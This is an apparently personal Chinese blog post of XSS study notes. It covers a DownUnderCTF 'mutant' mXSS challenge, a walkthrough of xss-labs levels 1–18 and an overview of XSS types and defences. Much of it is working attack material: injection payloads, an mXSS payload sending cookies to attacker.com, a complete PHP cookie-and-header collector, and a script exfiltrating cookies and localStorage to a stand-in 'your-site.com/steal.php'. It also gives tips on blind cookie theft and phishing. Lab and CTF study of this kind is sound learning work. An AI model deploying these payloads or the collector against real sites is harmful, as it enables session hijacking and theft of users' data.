---
title: "一个男人一句话改变我的一生之xss"
date: "2025-10-20 19:06:38"
tags: ["web安全"]
categories: ["一个男人一句话改变我的一生"]
url: "/posts/33318.html"
abbrlink: "33318"
---

# 前言

```
_sun_.empty.师傅给我看了一道国际赛easy难度的xss题目，实在不会，于是打算复现一下
结果docker的时候xss-bot拉起太慢，使用镜像之后修改文件又出现问题，所以就单纯的白盒审计一下这道题，"意因"一下
这题的点是解析器的标签"空间"问题,以及常见的顺序验证错误【代码审计中常出现的参数可控问题】

一开始看到这道题的时候还在想是不是自己的xss知识点缺失很大，于是打算整理复现一手关于xss的基础知识，方便以后见到好翻翻笔记
结果是标签问题【更大的盲区，所以后面不涉及css之类的xss，xss原型链污染，dom属性的深层次研究，遇到了再说，嘻嘻】
感谢sun师傅的拷打，让我又又又涨见识了

这篇文章个人感觉还是很水的，因为感觉东西还是特别多，研究不深
有什么错误的地方希望跟师傅们交流，大师傅快来拷打我，我一定会努力的，呜呜呜。
```

# mutant

https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/

![image-20251020163628329](/images/image-20251020163628329.png)

使用了\<template>标签

```
<template>是 HTML5 引入的特殊元素，它的内容被视为"惰性"的：
不会立即渲染
不会执行脚本
不会加载资源
保持内容隔离，直到被激活使用
```

if (n.attributes)

```
移除所有属性
```

if (n.nodeName !== "#document-fragment" &&       (n.nodeName.length === 6 || n.nodeName.length === 8))

```
删除特定长度标签名的元素
```

for (let i = n.children.length - 1; i >= 0; i--)

```
深度遍历整个DOM树
```

payload解析

```
<form>
  <math>
    <mtext></form>
<form>
  <malignmark>
    <style></math>
<img src onerror=alert(1)>
```

1. 解析器遇到`<form>`开始标签然后是`<math>`标签（MathML命名空间）接着是`<mtext>`标签【这里是mathml的元素】

2. `</form>`：在MathML命名空间内遇到`</form>`【html元素】会触发特殊行为解析器会"关闭"当前表单，解析器对其进行处理

   ```
   <form></form> 
   <math><mtext></mtext></math> 
   ```

3. 后续\<style>【是在html的标签，出现在mathml中】,\</math>使得解释器混淆触发闭合\<form>

4. `malignmark`标签名长度是10，不会被删除`style`标签名长度是5，不会被删除`img`标签名长度是3

解释器处理时间：

DOM 变异在 `innerHTML`赋值时已经发生

`onerror`在属性移除前已经生效

项目会让xss-bot来触发访问该链，要获得其cookie

```
<form><math><mtext></form><form><malignmark><style></math><img src=1 onerror="fetch(`https://attacker.com/steal?cookie=${encodeURIComponent(document.cookie)}`)">
```

```
fetch('https://attacker.com/steal', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    cookie: document.cookie,
    url: location.href,
    userAgent: navigator.userAgent
  })
});
```

这是手搓的平台搭建获取cookie方式

这题的关键点是混淆解析器，在mathml空间中标签和html空间中标签的差异，引起解析器对于异常代码的处理

# 引用

有些引用在文章当中

[XSS 漏洞全解析：从原理到实战-CSDN博客](https://blog.csdn.net/2301_80637449/article/details/153076191)

[XSS原理分析与绕过总结-先知社区](https://xz.aliyun.com/news/12336)

[XSS总结-先知社区](https://xz.aliyun.com/news/3699)

[XSS 漏洞深度解析：攻防对抗与高阶利用 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/423546.html)

[XSS 攻击思路总结 | 国光](https://www.sqlsec.com/2020/10/xss2.html#总结)

[XSS 从零开始 | 国光](https://www.sqlsec.com/2020/01/xss.html)

https://www.bilibili.com/video/BV123yAYMEwb/?p=53&share_source=copy_web&vd_source=46dcac097257d547144350b30f96978c

# 简介

XSS 是攻击者通过在网页中注入恶意 JavaScript 脚本，当用户访问被注入的页面时，脚本在用户浏览器中执行，从而实现窃取 cookie、劫持会话、钓鱼攻击等恶意操作的漏洞。其本质是Web 应用对用户输入的过滤不严格，导致未经过滤的输入被当作 HTML/JavaScript 代码在浏览器中解析执行。

# XSS 分类

## **反射型 XSS**

```
恶意脚本通过 URL 参数传入，服务器未过滤直接返回页面中
非持久化，需诱骗用户点击含恶意参数的 URL
适合钓鱼攻击（如伪造登录链接）、一次性会话劫持
```

## **存储型 XSS**

```
恶意脚本被存储到服务器（如数据库、文件），用户访问页面时被加载执行
持久化，所有访问该页面的用户都会触发
危害最大，可批量攻击（如论坛、留言板）、长期控制目标
```

## **DOM 型 XSS**

```
恶意脚本未经过服务器，仅在客户端通过 JavaScript 操作 DOM 时注入
完全在客户端执行，服务器响应中无恶意代码
难被服务器端 WAF 检测，适合绕过防护机制
```

# xss靶场

## xss-lab

【基础认识】

[xss-labs靶场1-20关详解 - L00kback - 博客园](https://www.cnblogs.com/L00kback/p/17552275.html)

[xss-labs 通关教程 - 博客](https://skywt.cn/blog/xss-labs-tutorial#level-1文本解析为-html)

### leve1

![image-20251017141145726](/images/image-20251017141145726.png)

代码直接将从URL参数`name`获取的用户输入（`$str`）拼接进HTML页面输出

没有进行任何过滤或转义处理,直接注入：

```
<script>alert(1)</script>
```

### leve2

![image-20251017141918087](/images/image-20251017141918087.png)

```
htmlspecialchars($str)  将字符串中的特殊字符转换为HTML实体
```

但是在表单当中的value值没有进行过滤，在这里可以进行构造payload

```
将这一句的value="x">
x如果填入"><script>alert(1)</script>就等于插入了一句js代码
value=""><script>alert(1)</script>
```

### leve3

![image-20251017142811091](/images/image-20251017142811091.png)

```
在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 <、>、&、'、" 这五个字符，基本可以防范这里的 XSS 攻击。
但是，8.1.0 以下版本的 PHP 默认只会转义 <、>、&、" 这四个字符，不会转义单引号 '。这就给这个函数带来了巨大的安全隐患。

<8.1.0
htmlspecialchars()函数把预定义的字符转换为 HTML 实体
预定义的字符有：
 & （和号）成为 &amp;
 " （双引号）成为 &quot;
 ' （单引号）成为 '
 < （小于）成为 &lt;
 > （大于）成为 &gt;
```

那么就可以使用'来闭合value='' 但是<被过滤成了&1t 那么就构造不出额外的语句，在句内构造可以使用到触发器鼠标点击事件`onfocus``onclinck``onmouseover`等。

```
' onmouseover=javascript:alert(1)
' onclick='alert(1)
```

### leve4

![image-20251017144147810](/images/image-20251017144147810.png)

这里的value没有使用htmlspecialchar()来转义，但是使用了str_replace()来将<和>转化成空格 可以使用""闭合value构造payload 但是不能使用<和> 那就可以继续使用触发器来进行过滤

```
"onclick="alert(1)
"onmouseover=alert(1)"
```

### leve5

![image-20251017145015924](/images/image-20251017145015924.png)

这里的value依旧没有使用htmlspecialchar()来转义，但是使用了str_replace()来将<script和on转化带下划线的形式 说明不能使用鼠标触发事件了因为都带着on，可以利用 JavaScript 的 URI

```
<a> 标签的 href 值并非只能是 URL，而是 URI。URI（Uniform Resource Identifier）可以视为 URL 的超集，其不仅包含以 protocol://address 开头的 URL，也包含 protocol:content 这种形式的地址（参见 RFC 3986）。经常用到的有：javascript: 后接 js 代码，这样的 URI 打开后会运行一段 js 代码；mailto: 后接一个邮箱，这样的 URI 打开后会开启系统中的邮箱类应用程序，创建发送给目标地址的一封邮件。
```

使用">闭合前一句，再构造<a></a>语句

```
"><a href=javascript:alert(1)>
```

### leve6

![image-20251017145811434](/images/image-20251017145811434.png)

过滤增加了src,data,href

HTML 并不区分大小写,所以所以将 href 替换大小写就好了

```
"><a hrEf=javascript:alert(1)>
```

### leve7

跟6不一样是简单过滤，而是全部置空了

![image-20251017174535233](/images/image-20251017174535233.png)

经典的只过滤了一次，只要构造了过滤之后还是能使用的payload就行了

```
"> <scriscriptpt>alert(1);</scriscriptpt>
```

### leve8

![image-20251017183446774](/images/image-20251017183446774.png)

value的值被htmlspecialchars()函数过滤了，但是在<a>标签当中还有

想要构造javascript:alert(1)，但是会变成javascr_ipt

href的属性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。

```
HTML 实体有两种写法，第一种是之前提到的 &entity_name; 形式，比如 $lt; 表示小于号；第二种是 &#entity_number; 形式，其中 entity_number 是字符的实体编号，比如 &#60; 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。
```

那么只要对payload进行html实体转化就可【全局和部分都可以】

```
javascr&#x69;pt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```

### leve9

![image-20251018002224373](/images/image-20251018002224373.png)

在8的基础上对加友链进行了验证是否含有http://字符

```
strpos()
函数用于在字符串中查找子字符串http://的位置。如果找到了子字符串，则返回子字符串的起始位置（也就是一个非负整数值）。如果没有找到子字符串，则返回false。
```

那么就可以开始改造8的payload,将http://注释掉就可以了

```
javascr&#x69;pt:alert(1)//http://
```

### leve10

![image-20251018004243477](/images/image-20251018004243477.png)

有三个表单是hidden的，但是只有t_sort可以get控制以及参与解析

关于<>的过滤就可以闭合value使用鼠标事件，以及hidden可以使用type对后面的hidden进行重置就不用在html上面改出表单再提交了

```
?keyword=1&t_sort=" onclick="alert(1)" type "
?keyword=1&t_sort=" onmouseover=javascript:alert(1) type "
```

### leve11

![image-20251018005131086](/images/image-20251018005131086.png)

```
$_SERVER['HTTP_REFERER']是一个PHP超全局变量，用于获取当前页面的前一个页面的URL地址。
```

跟10的区别就是将payload放到了ref头上

![image-20251018005401956](/images/image-20251018005401956.png)

```
Referer：" onclick="alert(1)" type "
Referer：" onmouseover=javascript:alert(1) type "
```

### leve12

![image-20251018005528385](/images/image-20251018005528385.png)

和前面的一样，将payload改到了ua头上

```
User-Agent：" onclick="alert(1)" type "
User-Agent：" onmouseover=javascript:alert(1) type "
```

### leve13

![image-20251018005742527](/images/image-20251018005742527.png)

和前面的一样，将payload改到了cookie头上

```
Cookie：user=" onclick="alert(1)" type "
Cookie：user=" onmouseover=javascript:alert(1) type "
```

### leve14

【链接无效】

![image-20251018010324147](/images/image-20251018010324147.png)

查看图片 exif 信息的网站

修改iframe调用的文件来实现xss注入

### leve15

![image-20251018010603698](/images/image-20251018010603698.png)

在 URL 中指定的 src（默认是 1.gif）会被引用进来，使用的是 ng-include。这是一个 Angular 框架的功能，特点是，如果引入的是 HTML 文件，不会执行其中 `<script>` 标签内的代码。

```
?src=level1.php?name=<img src=1 onerror=alert(1)>
```

这里直接引用leve1的payload，当然可以自己构造

```html
<html>
<h1>Hacked</h1>
<img src=1 onerror="alert(1)"></img>
</html>
```

假设放在网站根目录，payload 就是

```
?src="/alert.html"
```

### leve16

![image-20251018011553675](/images/image-20251018011553675.png)

对空格进行了过滤，使用换行符（`%0A`）或者`%0d`也可以

```
?keyword=<img%0Asrc=1%0Aonerror="alert(1)">
?keyword=<svg%0Aonload="alert(1)>"
```

### leve17

![image-20251018013156996](/images/image-20251018013156996.png)

```
<embed> 标签用于在HTML页面中嵌入外部内容，如多媒体文件、插件或其他交互式内容。它是HTML5的一部分。
以下是 <embed> 标签的基本语法：
<embed src="URL" type="MIME-类型" width="宽度" height="高度">
常用的属性包括：
src：指定要嵌入的外部资源的URL。可以是音频、视频、SWF 文件等。
type：指定被嵌入资源的MIME类型。
width：指定嵌入内容的宽度（像素或百分比）。
height：指定嵌入内容的高度（像素或百分比）。
```

这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。从而执行JavaScript语句。

```
?arg01=a&arg02=b onmousemove='alert(1)' 
?arg01=a&arg02=b onclick='alert(1)'
```

### leve18

和17一样

![image-20251018014118392](/images/image-20251018014118392.png)

### leve19

后面的flash有点看不懂了，但是也是古老的东西先放着吧

# 文件上传配合xss

前面用了这个xss-lab来了解了基础的xss知识，那么下面来认识特殊的几种的xss系列，svg-pdf-flash-mxss-uxss。【这里不展开说明如何制作，详情可以看小迪老师的b站视频[【小迪安全】全栈网络安全 | 渗透测试 | 高级红蓝对抗 V2024最新版 (完)_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV123yAYMEwb/?spm_id_from=333.1387.0.0&vd_source=3cad66818fbd72b6100b5f159983493b)】

## svg-xss

SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg/png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。

## pdf-xss

PDF XSS（PDF 跨站脚本）漏洞是指攻击者通过在 PDF 文件中植入恶意 JavaScript 代码，利用 PDF 阅读器或在线预览工具的安全缺陷，实现代码执行的一类漏洞。与传统网页 XSS 不同，PDF XSS 的载体是 PDF 文件，攻击场景更隐蔽，且依赖于 PDF 处理工具的解析逻辑。

## swf-xss

SWF XSS 是一种通过 Flash 文件（SWF）中的漏洞执行跨站脚本攻击的技术。攻击者可以利用 SWF 文件中未正确处理的输入参数，注入恶意 JavaScript 代码，从而在目标用户的浏览器中执行。

# 突变体xss

## mxss

预览

https://blog.csdn.net/weixin_34087301/article/details/87982018?fromshare=blogdetail&sharetype=blogdetail&sharerId=87982018&sharerefer=PC&sharesource=2403_87580523&sharefrom=from_link

## uxss

翻译

UXSS保留了基本XSS的特点，利用漏洞，执行恶意代码，但是有一个重要的区别：**不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。**

[通用跨站脚本攻击(UXSS)什么是UXSS？ 大家都知道有反射型XSS、存储型XSS、DomXSS，还有之前wooyun - 掘金](https://juejin.cn/post/7031788659221200927)

# 平台搭建

## beef-xss

[XSS之Beef简单使用 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/443592.html)

docker拉取比较快捷方便

## 蓝莲花xss

[XSS 进阶篇：一文全面了解蓝莲花基本用法_xss蓝莲花-CSDN博客](https://blog.csdn.net/weixin_43263566/article/details/128848268)

https://github.com/firesunCN/BlueLotus_XSSReceiver

## 手搓

```
<?php
// 配置密码保护
$password = 'yourpassword123';

if(isset($_GET['view']) && $_GET['view'] === $password) {
    // 显示收集的数据
    header('Content-Type: text/html');
    echo '<h1>Stolen Data</h1><pre>';
    echo file_get_contents('stolen_data.log');
    echo '</pre>';
    exit;
}

// 记录数据
$data = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'cookie' => $_COOKIE,
    'get' => $_GET,
    'post' => $_POST,
    'headers' => getallheaders()
];

file_put_contents('data.txt', json_encode($data)."\n", FILE_APPEND);

// 返回无害响应
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
?>
```

```
<script>
fetch('https://your-site.com/steal.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        cookie: document.cookie,
        url: location.href,
        userAgent: navigator.userAgent,
        localStorage: JSON.stringify(localStorage)
    })
}).catch(e => console.error(e));
</script>
```

# 安全防御

【遇到安全防御，就跑路吧，本来利用的点就少，绕过也很鸡肋，可能ctf当中会出现关于考点绕过手段，需要使用的时候查相应cve或者文章就好了】

## csp

[Content Security Policy](https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=Content+Security+Policy&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiJDb250ZW50IFNlY3VyaXR5IFBvbGljeSIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjI1NDE0MDQ2NSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.fjiJOVS7QHKYD8ZuPn9LZzbgPjj6EmqperajT0eWUZg&zhida_source=entity)（CSP）是一种浏览器安全机制，用于防止各种类型的[跨站脚本攻击](https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=跨站脚本攻击&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLot6jnq5nohJrmnKzmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.Dt3u0GHZEZ5dcLGm83Eg6EEwiwKqKAjs2UuR2M7cYb0&zhida_source=entity)（XSS）和[数据注入攻击](https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=数据注入攻击&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLmlbDmja7ms6jlhaXmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.ldB8RMO-1-GDB2ZNl5nNdIIHN7NKoI0Ks91Ygu7xr6g&zhida_source=entity)。通过定义一组规则，CSP 允许网站管理员指定哪些资源可以被加载和执行，进而限制外部恶意脚本的执行，确保网站的安全性。CSP 为网站提供了一层额外的保护，可以有效地阻止恶意代码注入，提升网站的抗攻击能力。本文将详细讲解什么是 CSP，如何使用 CSP 配置 Web 应用程序的安全策略。

## httponly

如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性，即便是这样，也不要将重要信息存入cookie。XSS全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，XSS属于被动式且用于客户端的攻击方式，所以容易被忽略其危害性。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。

绕过【实则不太管用】：

```
cve-2012

phpinfo

flash，java的api获取
```

## xssfifter

就是前面的各种正则的限制手段，依旧标签过滤

# xss-stricke

XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。

[s0md3v/XSStrike: Most advanced XSS scanner.](https://github.com/s0md3v/XSStrike)

就像sql注入中的sqlmap

# 攻防利用

关于xss的攻防利用，多用于组合拳的使用以及攻防时候，src利用的点少，能弹窗验证有漏洞点就好了，差异还是挺大的，但是问题不大，还是比较好食用

## cookie盗取

就是盲打，把有数据交互的地方都插上payload，等想应登陆态的用户查看或者点击，以达到获得cookie会话

## 钓鱼

弹窗跳转网页，或者提醒下载更新，已达到具体想要上线或者敏感信息获取的效果

## 联合代码审计rce

这是小迪安全2024xss部分的一个小皮面板案例，具体的cms偏代码审计的联动外部请求进行rce，需要特定情况下的xss条件才能产生







































